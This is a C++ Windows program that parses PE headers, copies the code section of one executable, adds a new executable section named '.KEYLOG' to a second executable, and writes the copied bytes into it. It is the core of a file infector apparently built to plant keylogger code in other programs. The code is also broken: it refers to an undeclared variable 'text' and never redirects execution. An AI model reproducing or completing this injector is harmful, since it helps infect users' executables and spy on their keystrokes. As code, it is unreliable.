#include<Windows.h>
#include<iostream>
using namespace std;

DWORD align(DWORD size,DWORD align,DWORD addr) {
	if (!(size % align)) return addr + size;
	return addr + (size / align + 1) * align;

}
int main() {
	wchar_t name2[] = L"test.exe";
	HANDLE infected_file = CreateFile(name2, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD infect_size = GetFileSize(infected_file, NULL);
	BYTE* byte_infected = new BYTE[infect_size];
	DWORD af;
	ReadFile(infected_file, byte_infected, infect_size, &af, NULL);

	PIMAGE_DOS_HEADER dos_infected = (PIMAGE_DOS_HEADER)byte_infected;
	PIMAGE_NT_HEADERS nt_infected = (PIMAGE_NT_HEADERS)(byte_infected + dos_infected->e_lfanew);
	PIMAGE_SECTION_HEADER first_infect = IMAGE_FIRST_SECTION(nt_infected);


	unsigned max = text->SizeOfRawData;
	cout << max << '-' << text->Name << '-' << text->PointerToRawData;
	BYTE* b = new BYTE[max + 1];
	for (int i = 0; i <= max; i++) {
		b[i] = byte_infected[text->PointerToRawData + i];
		
	}
	//=================
	//wchar_t  name[] = L"C:\\Users\\TrungPC\\source\\repos\\Project_test\\Project1\\hello_32.exe";
	wchar_t name[] = L"hello_32.exe";
	char sec[] = ".KEYLOG";
	HANDLE file = CreateFile(name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		cout << "CAN'T OPEN FILE\n";
		return false;
	}
	DWORD fileSize = GetFileSize(file, NULL);

	BYTE* pByte = new BYTE[fileSize];
	DWORD dw;
	ReadFile(file, pByte, fileSize, &dw, NULL);

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;//!=MZ

	PIMAGE_FILE_HEADER fh = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
	PIMAGE_OPTIONAL_HEADER oh = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew+sizeof(DWORD) +sizeof(IMAGE_FILE_HEADER) );
	PIMAGE_SECTION_HEADER sh = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	
	ZeroMemory(&sh[fh->NumberOfSections],sizeof(IMAGE_SECTION_HEADER) );
	CopyMemory(&sh[fh->NumberOfSections].Name,sec,8);
	
	sh[fh->NumberOfSections].Misc.VirtualSize = align(max, oh->SectionAlignment, 0);
	sh[fh->NumberOfSections].VirtualAddress = align(sh[fh->NumberOfSections - 1].Misc.VirtualSize, oh->SectionAlignment, sh[fh->NumberOfSections - 1].VirtualAddress);
	sh[fh->NumberOfSections].SizeOfRawData = align(max, oh->FileAlignment, 0);
	sh[fh->NumberOfSections].PointerToRawData = align(sh[fh->NumberOfSections - 1].SizeOfRawData, oh->FileAlignment, sh[fh->NumberOfSections - 1].PointerToRawData);
	sh[fh->NumberOfSections].Characteristics = (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ);
	
	SetFilePointer(file, sh[fh->NumberOfSections].PointerToRawData + sh[fh->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
	SetEndOfFile(file);
	oh->SizeOfImage = sh[fh->NumberOfSections].VirtualAddress + sh[fh->NumberOfSections].Misc.VirtualSize;
	fh->NumberOfSections += 1;
	SetFilePointer(file, 0, NULL, FILE_BEGIN);
	WriteFile(file, pByte, fileSize, &dw, NULL);
	CloseHandle(file);
	//cout << "OK\n";

	//add code
	 
	file = CreateFile(name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		cout << "CAN'T NOT ADD CODE\n";
		exit(0);
	}
	DWORD size = GetFileSize(file, NULL);
	BYTE* byte_code = new BYTE[size];
	DWORD ar;
	ReadFile(file, byte_code, size, &ar, NULL);
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)byte_code;
	PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)(byte_code+dos_header->e_lfanew) ;

	PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
	PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);

	//

	
	
		SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
		WriteFile(file, b, max, &af, 0);
		CloseHandle(file);
		CloseHandle(infected_file);
		
		return 1;
}
